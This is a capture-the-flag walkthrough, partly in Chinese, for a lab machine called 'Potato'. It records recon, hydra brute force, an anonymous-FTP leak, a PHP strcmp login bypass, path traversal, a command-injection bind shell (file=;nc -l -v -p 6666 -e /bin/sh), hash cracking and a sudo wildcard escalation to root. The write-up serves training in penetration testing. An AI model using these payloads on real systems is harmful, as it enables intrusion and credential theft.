# Potato
![image](https://hackmd.io/_uploads/r1jASYF2yx.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 192.168.111.101     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 08:11 EDT
Nmap scan report for 192.168.111.101
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds

```
#### 1.2 dirsearch
```
┌──(chw㉿CHW)-[~]
└─$ dirsearch -u http://192.168.111.101 
...
[08:13:43] 301 -  318B  - /admin  ->  http://192.168.111.101/admin/         
[08:13:44] 200 -  228B  - /admin/                                           
[08:13:44] 200 -  228B  - /admin/index.php                                  
[08:13:44] 200 -  489B  - /admin/logs/  
...
```
- 瀏覽路徑 `/admin/index.php`\
![image](https://hackmd.io/_uploads/r1NRDKKnkl.png)

- 瀏覽路徑 `/admin/logs`\
![image](https://hackmd.io/_uploads/SyMxdtFnke.png)
    - `/admin/logs/log_01.txt`
    ![image](https://hackmd.io/_uploads/HJec5ttnyx.png)
    - `/admin/logs/log_02.txt`
    ![image](https://hackmd.io/_uploads/B14ocFK31x.png)
    - `/admin/logs/log_03.txt`
    ![image](https://hackmd.io/_uploads/HkWp5tt2kl.png)

### 2. hydra 
- HTTP Post
![image](https://hackmd.io/_uploads/S1t70tthyx.png)
```
┌──(chw㉿CHW)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.111.101 http-post-form "/admin/index.php?login=1:username=admin&password=^PASS^:F=Bad user/password! "
```
- SSH
```
┌──(chw㉿CHW)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.111.101
```
>[!Tip]
天荒地老
### 3. Nmap -p-
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sS -p-  192.168.111.101                                      
[sudo] password for chw: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 09:46 EDT
Nmap scan report for 192.168.111.101
Host is up (0.089s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
2112/tcp  open     kip

┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sC -sV -p  2112  192.168.111.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 09:52 EDT
Nmap scan report for 192.168.111.101
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

```
> Anonymous FTP login allowed
### 4. ftp
使用 `anonymous` 連線
```
┌──(chw㉿CHW)-[~]
└─$ ftp anonymous@192.168.111.101 2112
Connected to 192.168.111.101.
220 ProFTPD Server (Debian) [::ffff:192.168.111.101]
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.251.111 !
230-
230-The local time is: Thu Mar 20 13:55:30 2025
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||22207|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> 
```
將 `index.php.bak` 與 `welcome.msg` 取出查看
```
ftp> get index.php.bak
local: index.php.bak remote: index.php.bak
229 Entering Extended Passive Mode (|||33583|)
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
   901      226.01 KiB/s 
226 Transfer complete
901 bytes received in 00:00 (9.81 KiB/s)
ftp> get welcome.msg
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||48470|)
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
    54      446.90 KiB/s 
226 Transfer complete
54 bytes received in 00:00 (0.60 KiB/s)
```
- index.php.bak:
![image](https://hackmd.io/_uploads/Hy2NyjFhyg.png)
> php-strcmp 可以被 bypass
- welcome.msg:
![image](https://hackmd.io/_uploads/BydIkot2Jg.png)

### 5. Bypass PHP strcmp
https://rst.hashnode.dev/bypassing-php-strcmp\
可以透過 empty array，`[]` bypass 驗證\
```
username=admin&password[]=chw
```
![image](https://hackmd.io/_uploads/ryejlitnyg.png)

### 6. Admin Page
http://192.168.111.101/admin/dashboard.php\
![image](https://hackmd.io/_uploads/HJwmGiY3yg.png)

其中 Logs 功能:\
![image](https://hackmd.io/_uploads/HJ0LGsFnJl.png)
嘗試 Path Traversal: `file=../../../../../etc/passwd`\
![image](https://hackmd.io/_uploads/rkMgQjKnyl.png)
> `webadmin`:`$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/`
>> 1. 嘗試 hashcat 爆破
>> 2. command injection:
>> - reverse shell 打不回來
>> - 使用 bind shell
>> `file=;nc -l -v -p 6666 -e /bin/sh`

### 7. bind shell
`file=;nc -l -v -p 6666 -e /bin/sh`
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.111.101 6666   

python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@serv:/var/www/html/admin$ 
```

### ✅ Get User Flag
> 在 `/home/webadmin`找到 User flag
## Privileges Escalation
先拿到低權限 User
### 8. Hashcat
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 500 potato.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
...
$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:dragon 
...
```
> `webadmin`:`dragon`

### 9. Sudo -l
```
┌──(chw㉿CHW)-[~]
└─$ ssh webadmin@192.168.111.101 
webadmin@192.168.111.101's password: 

webadmin@serv:~$ sudo  -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

webadmin@serv:~$ sudo nice /bin/sh
Sorry, user webadmin is not allowed to execute '/usr/bin/nice /bin/sh' as root on serv.
```
使用 /bin/nice 執行
```
webadmin@serv:~$ /bin/nice /bin/bash
webadmin@serv:~$ id
uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
webadmin@serv:~$ ls /notes/
clear.sh  id.sh
webadmin@serv:~$ sudo /bin/nice /notes/id.sh
uid=0(root) gid=0(root) groups=0(root)
```
目標： 使用 `/bin/nice` 執行 Shell 就能拿到 root 權限
(`sudo -l` 只會驗證 `/notes/*` 參數)
```
webadmin@serv:~$ sudo /bin/nice /notes/../bin/bash
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@serv:/home/webadmin# cd /root
root@serv:~# ls
proof.txt  root.txt  snap
```
### ✅ Get Root FLAG
